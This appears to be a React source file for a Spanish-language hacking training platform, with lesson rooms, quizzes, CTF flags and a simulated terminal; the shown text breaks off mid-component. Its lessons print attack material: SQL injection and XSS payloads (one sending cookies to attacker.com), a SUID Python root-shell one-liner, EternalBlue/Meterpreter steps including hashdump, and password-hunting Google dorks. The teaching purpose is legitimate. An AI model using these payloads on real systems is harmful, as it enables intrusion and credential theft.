import { useState, useEffect, useRef } from "react";

const FS = {
  "/":{ type:"dir", children:["home","etc","var","tmp","dev"] },
  "/home":{ type:"dir", children:["hacker",".secret_dir"] },
  "/home/hacker":{ type:"dir", children:["notes.md",".bash_history",".ssh","challenge","Desktop"] },
  "/home/hacker/Desktop":{ type:"dir", children:["readme.txt"] },
  "/home/hacker/Desktop/readme.txt":{ type:"file", content:"Bienvenido al lab. Busca el archivo flag.txt en /home/hacker/challenge/" },
  "/home/hacker/notes.md":{ type:"file", content:"# Notas\ncontraseña backup: hunter2\nTODO: mover flag a lugar más seguro" },
  "/home/hacker/.bash_history":{ type:"file", content:"ls -la\ncd challenge\ncat flag.txt\nsudo su\n" },
  "/home/hacker/.ssh":{ type:"dir", children:["id_rsa","authorized_keys"] },
  "/home/hacker/.ssh/id_rsa":{ type:"file", content:"-----BEGIN RSA PRIVATE KEY-----\n[CLAVE PRIVADA - No compartas esto!]\n-----END RSA PRIVATE KEY-----" },
  "/home/hacker/challenge":{ type:"dir", children:["flag.txt","hint.txt"] },
  "/home/hacker/challenge/hint.txt":{ type:"file", content:"Pista: usa cat flag.txt" },
  "/home/hacker/challenge/flag.txt":{ type:"file", content:"THM{linux_recon_master}" },
  "/etc":{ type:"dir", children:["passwd","shadow","hosts"] },
  "/etc/passwd":{ type:"file", content:"root:x:0:0:root:/root:/bin/bash\nhacker:x:1000:1000::/home/hacker:/bin/bash\nwww-data:x:33:33::/var/www:/bin/sh" },
  "/etc/shadow":{ type:"file", content:"Permission denied" },
  "/etc/hosts":{ type:"file", content:"127.0.0.1   localhost\n10.10.10.5  target-machine" },
  "/var":{ type:"dir", children:["log","www"] },
  "/var/log":{ type:"dir", children:["auth.log","syslog"] },
  "/var/log/auth.log":{ type:"file", content:"Jan 1 12:00:01 sshd[1234]: Failed password for root from 192.168.1.100\nJan 1 12:00:05 sshd[1234]: Accepted password for hacker from 10.10.10.1" },
  "/tmp":{ type:"dir", children:["exploit.py"] },
  "/tmp/exploit.py":{ type:"file", content:"#!/usr/bin/env python3\n# Archivo dejado por atacante anterior\nprint('shell')" },
};

const ROOMS = [
  {
    id:"linux", title:"Linux Fundamentals", icon:"🐧", diff:"Fácil", xp:150,
    desc:"Domina la terminal: navegación, permisos y reconocimiento interno.",
    tasks:[
      {
        id:"nav", title:"Navegando el sistema de archivos",
        theory:`En Linux, el sistema de archivos es la base de todo. Comandos esenciales:

**ls** — Lista archivos y directorios
**ls -l** — Lista con detalles (permisos, dueño, tamaño, fecha)
**ls -a** — Muestra archivos ocultos (los que empiezan con .)
**ls -la** — Combina ambos: detalles + archivos ocultos
**cd [dir]** — Cambia de directorio
**pwd** — Muestra la ruta actual
**cat [archivo]** — Muestra el contenido de un archivo

Los atacantes usan estos comandos para **reconocimiento interno** cuando obtienen acceso a un sistema. Los archivos ocultos (.) frecuentemente contienen claves SSH, historial de comandos y credenciales.`,
        challenge:{
          type:"terminal_cmd",
          prompt:"Estás en /home/hacker. Escribe el comando para ver TODOS los archivos (incluyendo ocultos) con detalles completos:",
          answers:["ls -la","ls -al","ls -l -a","ls -a -l","ls --all -l","ls -la .","ls -al ."],
          flag:"THM{linux_recon_master}",
          hint:"Combina el flag -l (detalles) con -a (all/ocultos). Puedes escribirlos juntos: ls -la",
        }
      },
      {
        id:"perms", title:"Permisos SUID — Escalada de privilegios",
        theory:`Los permisos en Linux controlan quién puede leer, escribir o ejecutar archivos.

**Formato:** -rwxr-xr-x  (tipo)(dueño)(grupo)(otros)
• **r** = leer (4)   **w** = escribir (2)   **x** = ejecutar (1)

**SUID bit — Set User ID:**
Cuando un ejecutable tiene el bit SUID activado, se ejecuta con los privilegios de su **dueño**, no del usuario que lo lanza.

Si root es dueño de un binario con SUID → cualquier usuario lo ejecuta **como root**.

\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`

Binarios SUID frecuentemente abusados: bash, python, vim, find, nmap`,
        challenge:{
          type:"quiz",
          question:"Un archivo /usr/bin/python3 tiene permisos '-rwsr-xr-x' y dueño root. ¿Qué puede hacer un atacante?",
          options:[
            "Solo leer el archivo, nada más",
            "Ejecutar Python con privilegios de root y obtener una shell de root",
            "El archivo es inaccesible para usuarios normales",
            "Solo el grupo puede ejecutarlo",
          ],
          correct:1,
          explanation:"La 's' en lugar de 'x' indica SUID. Ejecutar 'python3 -c \"import os; os.setuid(0); os.system(\\\"/bin/bash\\\")\"' daría shell de root. Esta es una de las técnicas de privesc más clásicas.",
          flag:"THM{suid_privesc_found}",
        }
      },
    ]
  },
  {
    id:"recon", title:"Reconocimiento & OSINT", icon:"🔍", diff:"Fácil", xp:200,
    desc:"Nmap, OSINT y técnicas de enumeración para mapear el objetivo.",
    tasks:[
      {
        id:"nmap", title:"Escaneo de puertos con Nmap",
        theory:`**Nmap** (Network Mapper) es la herramienta de reconocimiento de redes más usada en pentesting.

**Comandos esenciales:**
**nmap 192.168.1.1** — Escaneo básico (top 1000 puertos)
**nmap -p- 192.168.1.1** — Todos los 65535 puertos
**nmap -sV 192.168.1.1** — Detección de versiones de servicios
**nmap -O 192.168.1.1** — Detección del sistema operativo
**nmap -A 192.168.1.1** — Agresivo: versiones + OS + scripts
**nmap -sS 192.168.1.1** — SYN scan sigiloso
**nmap -sC 192.168.1.1** — Scripts NSE por defecto

**Puertos clave:**
21 FTP • 22 SSH • 23 Telnet • 25 SMTP • 53 DNS
80 HTTP • 443 HTTPS • 445 SMB • 3306 MySQL • 3389 RDP`,
        challenge:{
          type:"quiz",
          question:"Al escanear un servidor con Nmap encuentras el puerto 445 abierto. ¿Qué protocolo corre y qué ataque podrías intentar?",
          options:[
            "FTP — Ataque de fuerza bruta a credenciales FTP",
            "SMB — EternalBlue, Pass-the-Hash, enumeración de recursos compartidos",
            "HTTP — SQL Injection en la web",
            "DNS — Envenenamiento de caché DNS",
          ],
          correct:1,
          explanation:"El puerto 445 es SMB (Server Message Block). EternalBlue (MS17-010, usado por WannaCry) explota este servicio. También permite ataques Pass-the-Hash y enumeración con enum4linux.",
          flag:"THM{nmap_port_expert}",
        }
      },
      {
        id:"osint", title:"OSINT — Inteligencia de fuentes abiertas",
        theory:`**OSINT** es la recolección de información usando únicamente fuentes públicas, sin interactuar directamente con el objetivo.

**Herramientas y técnicas:**
**theHarvester** — Recolecta emails, subdominios, IPs desde Google, LinkedIn, Shodan
**Shodan** — Motor de búsqueda para dispositivos conectados a internet
**Maltego** — Mapea relaciones entre personas, dominios e IPs
**Google Dorks** — Búsquedas avanzadas en Google:
  • **site:**empresa.com filetype:pdf
  • **intitle:**"index of" /passwords
  • **inurl:**admin login

**WHOIS** — Información del registro de un dominio
**DNSDumpster** — Enumeración de subdominios y registros DNS

OSINT puede revelar emails de empleados, tecnologías usadas, subdominios olvidados e incluso credenciales en repositorios de GitHub.`,
        challenge:{
          type:"quiz",
          question:"¿Qué Google Dork usarías para buscar archivos de contraseñas expuestos en servidores con directory listing?",
          options:[
            'site:target.com "password"',
            'intitle:"index of" "passwords.txt"',
            'inurl:target.com/login',
            'filetype:html password target.com',
          ],
          correct:1,
          explanation:'"intitle:index of" encuentra servidores con directory listing habilitado. Añadir "passwords.txt" busca ese archivo específico. Esta técnica ha revelado miles de servidores mal configurados.',
          flag:"THM{osint_dork_master}",
        }
      },
    ]
  },
  {
    id:"web", title:"Web Hacking", icon:"🕸️", diff:"Medio", xp:300,
    desc:"SQL Injection, XSS y vulnerabilidades del OWASP Top 10.",
    tasks:[
      {
        id:"sqli", title:"SQL Injection — Bypass de autenticación",
        theory:`**SQL Injection** ocurre cuando datos del usuario se insertan sin sanitizar en una consulta SQL.

**Código vulnerable (PHP):**
\`\`\`sql
$query = "SELECT * FROM users 
          WHERE user='$_POST[user]' 
          AND pass='$_POST[pass]'";
\`\`\`

**Payload: admin'--**
Query resultante:
\`\`\`sql
SELECT * FROM users 
WHERE user='admin'--' AND pass='...'
\`\`\`
El -- comenta el resto, ignorando la contraseña.

**Payloads clásicos:**
• **admin'--** (comenta el resto)
• **' OR 1=1--** (siempre verdadero)
• **' UNION SELECT 1,user(),3--** (extrae datos)`,
        challenge:{
          type:"login_bypass",
          desc:"Este panel de admin tiene SQL Injection. Entra como admin sin conocer la contraseña.",
          sqlAnswers:["admin'--","admin' --","' or 1=1--","' or '1'='1","admin'#","' OR 1=1#"],
          flag:"THM{sql_injection_pwned}",
          hint:"Usa el campo usuario. El -- en SQL comenta todo lo que viene después.",
        }
      },
      {
        id:"xss", title:"XSS — Cross-Site Scripting",
        theory:`**XSS** permite inyectar scripts maliciosos en páginas web vistas por otros usuarios.

**Tipos:**
**Reflected XSS** — El payload está en la URL y se refleja inmediatamente
**Stored XSS** — El payload se guarda en la BD y afecta a todos los visitantes
**DOM XSS** — La vulnerabilidad está en el JavaScript del cliente

**Payloads básicos:**
\`\`\`html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(document.domain)>
\`\`\`

**Robo de sesión (impacto real):**
\`\`\`html
<script>fetch('https://attacker.com?c='+document.cookie)</script>
\`\`\`

**Bypass de filtros:**
\`\`\`html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
\`\`\``,
        challenge:{
          type:"xss_input",
          desc:"El campo de búsqueda refleja tu input sin sanitizar. Inyecta un payload XSS.",
          xssPatterns:["<script","<img","<svg","onerror","onload","javascript:","<body","<iframe"],
          flag:"THM{xss_stored_pwned}",
          hint:"Prueba <script>alert(1)</script> o <img src=x onerror=alert(1)>",
        }
      },
    ]
  },
  {
    id:"crypto", title:"Criptografía", icon:"🔐", diff:"Medio", xp:250,
    desc:"Hashes, cifrados clásicos y técnicas de cracking.",
    tasks:[
      {
        id:"hashes", title:"Identificar y crackear hashes",
        theory:`Un **hash** es una función unidireccional que convierte datos en una cadena de longitud fija.

**Hashes comunes — identificación por longitud:**
• **MD5** → 32 chars: 5f4dcc3b5aa765d61d8327deb882cf99
• **SHA1** → 40 chars: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
• **SHA256** → 64 chars
• **bcrypt** → 60 chars, empieza con $2y$
• **NTLM** → 32 chars (Windows)

**Técnicas de cracking:**
**Diccionario** — Hashear palabras de wordlists (rockyou.txt = 14 millones)
**Rainbow tables** — Tablas precalculadas hash→texto
**Fuerza bruta** — Probar todas las combinaciones
**Reglas** — Mutar palabras: password→P@ssw0rd

**Herramientas:** Hashcat, John the Ripper, CrackStation (online)`,
        challenge:{
          type:"hash_crack",
          hash:"5f4dcc3b5aa765d61d8327deb882cf99",
          hashType:"MD5",
          answer:"password",
          flag:"THM{hash_cracked_basic}",
          hint:"Es el MD5 más famoso de la historia. La contraseña es la palabra más obvia posible.",
        }
      },
      {
        id:"cipher", title:"Cifrados clásicos — ROT13",
        theory:`Los **cifrados clásicos** son sustituciones simples del alfabeto, fundamentales para entender criptografía.

**Caesar Cipher:** desplaza cada letra N posiciones
• Con desplazamiento de 13 = **ROT13** (el más común en CTFs)
• ROT13 es su propio inverso: aplicarlo dos veces devuelve el original

**Tabla ROT13:**
A↔N  B↔O  C↔P  D↔Q  E↔R  F↔S  G↔T  H↔U  I↔V  J↔W  K↔X  L↔Y  M↔Z

**¿Cómo crackearlo?**
**Análisis de frecuencia** — Las letras más frecuentes en español: E, A, O, S, R, N
Si en el texto cifrado la letra más repetida es diferente a E, calcula el desplazamiento.

En CTFs siempre prueba: ROT13, Base64, Caesar, Vigenère.`,
        challenge:{
          type:"caesar",
          prompt:"Descifra este mensaje ROT13:",
          ciphertext:"GUZ{ebg13_vf_rnfl}",
          answer:"THM{rot13_is_easy}",
          flag:"THM{rot13_is_easy}",
          hint:"ROT13: T→G, H→U, M→Z... Usa la tabla interactiva de abajo.",
        }
      },
    ]
  },
  {
    id:"bof", title:"Buffer Overflow", icon:"💥", diff:"Difícil", xp:400,
    desc:"Entiende cómo desbordar buffers para tomar control de la ejecución.",
    tasks:[
      {
        id:"stack", title:"La pila (Stack) y la memoria",
        theory:`Un **Buffer Overflow** ocurre cuando un programa escribe más datos de los que caben en un buffer, sobreescribiendo memoria adyacente.

**Estructura del Stack:**
\`\`\`
ALTA MEMORIA
┌─────────────────┐
│   Argumentos    │
├─────────────────┤
│ Return Address  │ ← EIP/RIP (¡el objetivo!)
├─────────────────┤
│  Saved EBP      │
├─────────────────┤
│   BUFFER[100]   │ ← Aquí escribimos
└─────────────────┘
BAJA MEMORIA
\`\`\`

**Código vulnerable en C:**
\`\`\`c
void vuln() {
    char buffer[100];
    gets(buffer);  // Lee sin verificar límite!
}
\`\`\`

Si enviamos 120 bytes → sobreescribimos el Return Address
Si controlamos EIP → apuntamos a shellcode → ejecución arbitraria

**Herramientas:** GDB, pwndbg, pwntools, Immunity Debugger + Mona.py`,
        challenge:{
          type:"quiz",
          question:"En un Buffer Overflow clásico, ¿cuál es el registro más importante que el atacante necesita controlar para redirigir la ejecución?",
          options:[
            "ESP — Extended Stack Pointer (apunta al tope del stack)",
            "EAX — Registro de acumulador para operaciones",
            "EIP — Extended Instruction Pointer (siguiente instrucción a ejecutar)",
            "EBP — Extended Base Pointer (base del stack frame)",
          ],
          correct:2,
          explanation:"EIP (o RIP en 64-bit) contiene la dirección de la próxima instrucción. Si el atacante controla EIP, controla el flujo completo del programa. El objetivo del BOF es sobreescribir EIP con la dirección del shellcode.",
          flag:"THM{bof_eip_control}",
        }
      },
      {
        id:"bof2", title:"Fuzzing y encontrar el offset",
        theory:`Para explotar un BOF necesitas saber exactamente cuántos bytes son necesarios para sobreescribir EIP — esto se llama el **offset**.

**Proceso paso a paso:**

**1. Fuzzing** — Enviar buffers cada vez más grandes hasta crashear:
\`\`\`python
import socket
for i in range(100, 5000, 100):
    payload = b"A" * i
    s.send(payload)
\`\`\`

**2. Generar patrón único** (Metasploit):
\`\`\`bash
msf-pattern_create -l 3000
# Genera: Aa0Aa1Aa2Aa3Aa4Aa5...
\`\`\`

**3. Encontrar offset exacto:**
\`\`\`bash
msf-pattern_offset -l 3000 -q 39694438
# [*] Exact match at offset 2003
\`\`\`

**4. Verificar** — Si EIP = 42424242 (BBBB) → ¡Offset correcto!

**5. Después:** buscar bad chars → shellcode → JMP ESP → shell 🎉`,
        challenge:{
          type:"quiz",
          question:"Tienes EIP = '41346641' después de crashear con un patrón Metasploit de 300 bytes. ¿Cuál es el comando correcto?",
          options:[
            "msf-pattern_create -l 300 -q 41346641",
            "msf-pattern_offset -l 300 -q 41346641",
            "msf-pattern_offset -l 300 -q BBBB",
            "msf-pattern_create -l 41346641",
          ],
          correct:1,
          explanation:"msf-pattern_offset busca el valor de EIP (-q 41346641) dentro del patrón de longitud (-l 300) para darte el offset exacto. Esa posición es exactamente cuántos bytes necesitas para sobreescribir EIP.",
          flag:"THM{bof_offset_found}",
        }
      },
    ]
  },
  {
    id:"metasploit", title:"Metasploit Framework", icon:"🛡️", diff:"Medio", xp:300,
    desc:"Domina el framework de explotación más usado en pentesting.",
    tasks:[
      {
        id:"msfbasics", title:"Navegando msfconsole",
        theory:`**Metasploit Framework** es la plataforma de explotación más usada en pentesting. Contiene miles de exploits, payloads y módulos auxiliares.

**Tipos de módulos:**
\`\`\`
exploit/   → código que explota la vulnerabilidad
payload/   → shellcode que ejecuta al tener acceso
auxiliary/ → scanners, fuzzers, herramientas
post/      → módulos post-explotación
\`\`\`

**Flujo típico:**
\`\`\`bash
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
msf6 > set RHOSTS 10.10.10.40
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > run
\`\`\`

**Meterpreter** — Shell avanzada:
sysinfo, getuid, getsystem, hashdump, upload, download`,
        challenge:{
          type:"msf_terminal",
          flag:"THM{metasploit_basics}",
          hint:"Sigue los pasos: search eternalblue → use 0 → set RHOSTS 10.10.10.40 → run",
        }
      },
      {
        id:"meterpreter", title:"Post-explotación con Meterpreter",
        theory:`Una vez tienes una sesión **Meterpreter**, comienza la post-explotación.

**Comandos esenciales:**
\`\`\`bash
sysinfo          # OS, hostname, arquitectura
getuid           # Usuario actual
getsystem        # Escala a SYSTEM/root automáticamente
hashdump         # Vuelca hashes NTLM (requiere SYSTEM)
ps               # Lista procesos activos
migrate <PID>    # Migra a otro proceso
shell            # Abre cmd.exe
upload evil.exe C:\\Windows
download SAM
\`\`\`

**¿Por qué migrar de proceso?**
Si el proceso original muere, perdemos la sesión. Migrar a lsass.exe o svchost.exe da persistencia y acceso a credenciales en memoria.

**Módulos post:**
\`\`\`bash
run post/windows/gather/credentials/credential_collector
run post/multi/recon/local_exploit_suggester
\`\`\``,
        challenge:{
          type:"quiz",
          question:"Tienes sesión Meterpreter pero eres usuario con bajos privilegios en Windows. ¿Qué haces PRIMERO?",
          options:[
            "hashdump — Obtener hashes y crackearlos offline",
            "getsystem — Prueba múltiples técnicas de escalada automáticamente",
            "shell — Abrir cmd para usar exploit manual",
            "migrate — Moverme a un proceso de sistema primero",
          ],
          correct:1,
          explanation:"getsystem prueba múltiples técnicas (named pipe impersonation, token manipulation) automáticamente. Si funciona, tienes NT AUTHORITY\\SYSTEM. Después, hashdump extrae todos los hashes de cuentas Windows.",
          flag:"THM{meterpreter_post_pwn}",
        }
      },
    ]
  },
  {
    id:"forense", title:"Forense Digital", icon:"🕵️", diff:"Medio", xp:280,
    desc:"Analiza evidencia digital: archivos, metadatos y firmas.",
    tasks:[
      {
        id:"metadata", title:"Metadatos — Lo que los archivos esconden",
        theory:`Los **metadatos** son datos sobre datos. Un archivo aparentemente inocente puede revelar ubicación GPS, autor, software usado e historial de ediciones.

**Metadatos en imágenes (EXIF):**
\`\`\`bash
exiftool imagen.jpg
# GPS: 4 deg 42' N, 74 deg 2' W (¡Bogotá!)
# Camera: iPhone 15 Pro
# Date: 2024:01:15 14:32:11
\`\`\`

**Metadatos en documentos Word:**
\`\`\`bash
exiftool documento.docx
# Author: John Smith
# Company: Acme Corp
# Revision Number: 47
\`\`\`

**En casos reales:** fotos con GPS han ubicado a criminales. Documentos Word han revelado identidades de whistleblowers. Siempre analiza metadatos antes de publicar archivos.`,
        challenge:{
          type:"quiz",
          question:"Al ejecutar 'exiftool foto.jpg' ves: 'GPS Position: 4 deg 42' 23\" N, 74 deg 2' 21\" W'. ¿Qué información obtuviste?",
          options:[
            "La resolución de la imagen en megapíxeles",
            "Las coordenadas geográficas exactas donde se tomó la foto",
            "El número de versión del archivo JPEG",
            "La paleta de colores usada en la imagen",
          ],
          correct:1,
          explanation:"Los datos GPS en EXIF son coordenadas geográficas reales. 4°N 74°W corresponde aproximadamente a Bogotá, Colombia. Muchos smartphones guardan automáticamente la ubicación en cada foto a menos que el usuario lo desactive.",
          flag:"THM{metadata_exposed}",
        }
      },
      {
        id:"magicbytes", title:"Magic Bytes — Firmas de archivos",
        theory:`Las **firmas de archivos** (magic bytes) son los primeros bytes de un archivo que identifican su tipo real, independientemente de la extensión.

**Firmas comunes:**
\`\`\`
JPEG: FF D8 FF         → ÿØÿ
PNG:  89 50 4E 47      → ‰PNG
PDF:  25 50 44 46      → %PDF
ZIP:  50 4B 03 04      → PK..
EXE:  4D 5A            → MZ
GIF:  47 49 46 38      → GIF8
\`\`\`

**Ver magic bytes con xxd:**
\`\`\`bash
xxd archivo.bin | head -3
xxd imagen.jpg | head -1
# 00000000: ffd8 ffe0 0010 4a46  ..J F
\`\`\`

**Uso en CTFs:** Archivos con extensión incorrecta son muy comunes. Un .txt que empieza con MZ es un ejecutable. Un .png que empieza con FF D8 es un JPEG. Siempre verifica con **file** primero:
\`\`\`bash
file archivo_sospechoso.png
\`\`\``,
        challenge:{
          type:"quiz",
          question:"Analizas 'imagen.png' pero sus primeros bytes hex son: FF D8 FF E0 00 10 4A 46 49 46. ¿Qué es realmente?",
          options:[
            "Es un PNG legítimo, esos son sus magic bytes normales",
            "Es un archivo JPEG/JPG renombrado como PNG",
            "Es un archivo ZIP corrupto",
            "Es un ejecutable Windows disfrazado",
          ],
          correct:1,
          explanation:"FF D8 FF son los magic bytes de JPEG, no de PNG (que sería 89 50 4E 47). Fue renombrado de .jpg a .png para evadir filtros de subida o engañar usuarios. Siempre usa 'file' para verificar el tipo real.",
          flag:"THM{magic_bytes_detective}",
        }
      },
    ]
  },
  {
    id:"ctf", title:"CTF Challenges", icon:"🏁", diff:"Difícil", xp:500,
    desc:"Desafíos mixtos Capture The Flag para poner a prueba todo lo aprendido.",
    tasks:[
      {
        id:"stego", title:"Esteganografía — Mensajes ocultos",
        theory:`**Esteganografía** es el arte de ocultar información dentro de otro archivo sin que sea evidente. Diferente a criptografía: aquí el mensaje ni siquiera se ve.

**Técnica LSB (Least Significant Bit):**
Modifica el bit menos significativo de cada píxel. El cambio visual es imperceptible pero puede ocultar megabytes de datos.

**Herramientas para análisis:**
\`\`\`bash
file imagen.jpg          # Verifica tipo real
strings imagen.jpg | grep "THM{"   # Busca flags en texto
exiftool imagen.jpg      # Metadatos
binwalk imagen.jpg       # Busca archivos embebidos
binwalk -e imagen.jpg    # Extrae archivos encontrados
steghide extract -sf imagen.jpg    # Extrae datos ocultos
zsteg -a imagen.png      # Múltiples técnicas LSB
\`\`\`

**En CTFs:** el primer paso siempre es file → strings → exiftool → binwalk. Va de lo más rápido a lo más profundo.`,
        challenge:{
          type:"quiz",
          question:"Tienes una imagen PNG de un CTF. ¿Cuál es el orden correcto de análisis?",
          options:[
            "Abrir en Photoshop → ajustar brillo/contraste → buscar visualmente",
            "file → strings → exiftool → binwalk → steghide/zsteg",
            "Cambiar extensión a .zip → descomprimir → buscar flag",
            "base64 decode → ROT13 → MD5 hash",
          ],
          correct:1,
          explanation:"El flujo estándar: file (tipo real), strings (texto oculto), exiftool (metadatos), binwalk (archivos embebidos), steghide/zsteg (LSB). Este orden va de lo más rápido/obvio a lo más profundo. Siempre empieza simple.",
          flag:"THM{stego_methodology}",
        }
      },
      {
        id:"finalctf", title:"Mini CTF — Metodología completa",
        theory:`¡Hora de aplicar todo lo aprendido! Un CTF real combina múltiples disciplinas.

**Metodología general:**

**1. Reconocimiento**
→ nmap, gobuster (fuerza bruta de directorios), whatweb

**2. Enumeración**
→ nikto, enum4linux, smbclient, dirb

**3. Explotación**
→ Metasploit, exploit manual, SQLMap, Burp Suite

**4. Post-explotación**
→ Escalar privilegios, buscar flags, pivotar

**5. Flags típicas**
→ /root/root.txt y /home/user/user.txt (estilo TryHackMe)

**Tips de oro:**
• Siempre revisa código fuente HTML (Ctrl+U)
• Prueba credenciales por defecto: admin/admin
• robots.txt y sitemap.xml tienen rutas ocultas
• Base64 es el encoding más común: echo "dGVzdA==" | base64 -d`,
        challenge:{
          type:"final_ctf",
          steps:[
            { q:"Escaneas un servidor con nmap y encuentras el puerto 80 abierto. ¿Cuál es tu siguiente paso?", options:["Lanzar EternalBlue directamente","Abrir el navegador, ver la web, revisar código fuente y /robots.txt","Ejecutar hashdump inmediatamente","Intentar SSH con credenciales por defecto"], correct:1, exp:"Siempre enumera antes de explotar. Puerto 80 = HTTP. Abre el navegador, Ctrl+U para ver código fuente, visita /robots.txt. La información de reconocimiento es oro puro." },
            { q:"En /robots.txt encuentras 'Disallow: /secret-admin-panel'. ¿Qué haces?", options:["Ignorarlo, robots.txt prohíbe el acceso","Visitar /secret-admin-panel inmediatamente","Reportar el problema y no acceder","Usar nmap para escanear esa ruta"], correct:1, exp:"robots.txt solo instruye a crawlers, NO es control de acceso. En CTF/pentesting, los directorios en Disallow son exactamente donde mirar — son los que el admin intentó esconder." },
            { q:"El panel tiene un login. Username es 'admin'. ¿Qué pruebas PRIMERO?", options:["Fuerza bruta con rockyou.txt (puede tardar horas)","Credenciales por defecto: admin/admin, admin/password, admin/123456","SQLMap automático directamente","Revisar código fuente de la página de login"], correct:1, exp:"Siempre empieza por lo más simple. El 60% de CTFs para principiantes tienen admin/admin. Después prueba SQLi manual, luego SQLMap, y fuerza bruta como último recurso." },
          ],
          flag:"THM{ctf_methodology_master}",
        }
      },
    ]
  },
];

/* ─── TERMINAL ─── */
function Terminal({ onSuccess, flag, answers }) {
  const [hist, setHist] = useState([
    { t:"sys", v:"[hacker@lab-server ~]$ Sesión iniciada." },
    { t:"sys", v:'Escribe "help" para ver comandos disponibles.' },
  ]);
  const [input, setInput] = useState("");
  const [cwd, setCwd] = useState("/home/hacker");
  const [solved, setSolved] = useState(false);
  const endRef = useRef(null);
  const inputRef = useRef(null);
  useEffect(()=>{ endRef.current?.scrollIntoView({ behavior:"smooth" }); },[hist]);

  const add = (v,t="out") => setHistory(h=>[...h,{t,v}]);
  const setHistory = setHist;

  const res = (path) => {
    if (!path||path==="~") return "/home/hacker";
    if (path.startsWith("/")) return path.replace(/\/+$/,"")||"/";
    if (path==="..") { const p=cwd.split("/").filter(Boolean); p.pop(); return "/"+p.join("/")||"/"; }
    if (path===".") return cwd;
    return (cwd==="/"?"":cwd)+"/"+path;
  };

  const run = (raw) => {
    const cmd = raw.trim();
    setHistory(h=>[...h,{ t:"inp", v:`${cwd.replace("/home/hacker","~")} $ ${cmd}` }]);
    if (!cmd) return;

    // ✅ FIX: check command against answers array
    const norm = cmd.replace(/\s+/g," ").trim();
    if (!solved && answers && answers.some(a=>norm===a.trim())) {
      setSolved(true);
      const node = FS[cwd];
      if (node?.type==="dir") {
        const files = node.children||[];
        setHistory(h=>[...h,{ t:"out", v:`total ${files.length*4}` }]);
        setHistory(h=>[...h,{ t:"out", v:"drwxr-xr-x 2 hacker hacker 4096 Jan 01 ." }]);
        setHistory(h=>[...h,{ t:"out", v:"drwxr-xr-x 3 root   root   4096 Jan 01 .." }]);
        files.forEach(f => {
          const fp=(cwd==="/"?"":cwd)+"/"+f;
          const isDir=FS[fp]?.type==="dir";
          setHistory(h=>[...h,{ t:"out", v:`${isDir?"d":"-"}rwxr-xr-x 1 hacker hacker 4096 Jan 01 ${f}` }]);
        });
      }
      setHistory(h=>[...h,{ t:"ok", v:"✅ ¡Correcto! Puedes ver archivos ocultos (.bash_history, .ssh) con los flags -la" }]);
      setTimeout(()=>onSuccess(flag), 1200);
      return;
    }

    const parts=cmd.split(/\s+/); const c=parts[0]; const args=parts.slice(1);
    switch(c) {
      case "help": setHistory(h=>[...h,{ t:"out", v:"Comandos: ls, ls -la, ls -al, ls -l -a, cd, pwd, cat, whoami, id, find, clear" }]); break;
      case "pwd": setHistory(h=>[...h,{ t:"out", v:cwd }]); break;
      case "whoami": setHistory(h=>[...h,{ t:"out", v:"hacker" }]); break;
      case "id": setHistory(h=>[...h,{ t:"out", v:"uid=1000(hacker) gid=1000(hacker) grupos=1000(hacker),4(adm)" }]); break;
      case "clear": setHist([]); break;
      case "ls": {
        const fa=args.filter(a=>a.startsWith("-")).join("").replace(/-/g,"");
        const pa=args.find(a=>!a.startsWith("-"));
        const target=pa?res(pa):cwd;
        const node=FS[target];
        const showHidden=/a/.test(fa);
        const longFmt=/l/.test(fa);
        if (!node||node.type!=="dir") { setHistory(h=>[...h,{ t:"err", v:`ls: no se puede acceder a '${pa||""}': No existe` }]); break; }
        const files=(node.children||[]).filter(f=>showHidden||!f.startsWith("."));
        if (longFmt) {
          setHistory(h=>[...h,{ t:"out", v:`total ${(node.children||[]).length*4}` }]);
          if (showHidden) {
            setHistory(h=>[...h,{ t:"out", v:"drwxr-xr-x 2 hacker hacker 4096 Jan 01 ." }]);
            setHistory(h=>[...h,{ t:"out", v:"drwxr-xr-x 3 root   root   4096 Jan 01 .." }]);
          }
          files.forEach(f=>{
            const fp=(target==="/"?"":target)+"/"+f;
            const isDir=FS[fp]?.type==="dir";
            setHistory(h=>[...h,{ t:"out", v:`${isDir?"d":"-"}rwxr-xr-x 1 hacker hacker 4096 Jan 01 ${f}` }]);
          });
        } else {
          setHistory(h=>[...h,{ t:"out", v:files.join("  ")||"(vacío)" }]);
        }
        break;
      }
      case "cd": {
        const t=res(args[0]||"~");
        if (FS[t]?.type==="dir") setCwd(t);
        else setHistory(h=>[...h,{ t:"err", v:`cd: ${args[0]}: No existe el archivo o directorio` }]);
        break;
      }
      case "cat": {
        if (!args[0]) { setHistory(h=>[...h,{ t:"err", v:"cat: falta operando" }]); break; }
        const p=res(args[0]); const n=FS[p];
        if (!n) setHistory(h=>[...h,{ t:"err", v:`cat: ${args[0]}: No existe el archivo o directorio` }]);
        else if (n.type==="dir") setHistory(h=>[...h,{ t:"err", v:`cat: ${args[0]}: Es un directorio` }]);
        else {
          setHistory(h=>[...h,{ t:"out", v:n.content }]);
          if (!solved && n.content===flag) { setSolved(true); setTimeout(()=>onSuccess(flag),800); }
        }
        break;
      }
      case "find":
        setHistory(h=>[...h,{ t:"out", v:"Buscando..." }]);
        setTimeout(()=>{ setHistory(h=>[...h,{ t:"out", v:"/home/hacker/challenge/flag.txt\n/home/hacker/.ssh/id_rsa\n/home/hacker/.bash_history\n/tmp/exploit.py" }]); }, 400);
        break;
      default: setHistory(h=>[...h,{ t:"err", v:`${c}: comando no encontrado. Escribe "help"` }]);
    }
  };

  const cols={ sys:"#64ffda", inp:"#a8ff78", out:"#cdd6f4", err:"#ff6b6b", ok:"#64ffda" };
  return (
    <div onClick={()=>inputRef.current?.focus()} style={{ background:"#070b14",border:"1px solid #1a3050",borderRadius:8,fontFamily:"'JetBrains Mono','Fira Code',monospace",fontSize:13,padding:16,minHeight:280,maxHeight:340,overflowY:"auto",cursor:"text" }}>
      <div style={{ display:"flex",gap:6,marginBottom:10 }}>
        {["#ff5f57","#febc2e","#28c840"].map(c=><div key={c} style={{ width:10,height:10,borderRadius:"50%",background:c }}/>)}
        <span style={{ color:"#3a5a7a",fontSize:11,marginLeft:8 }}>hacker@lab — {cwd}</span>
      </div>
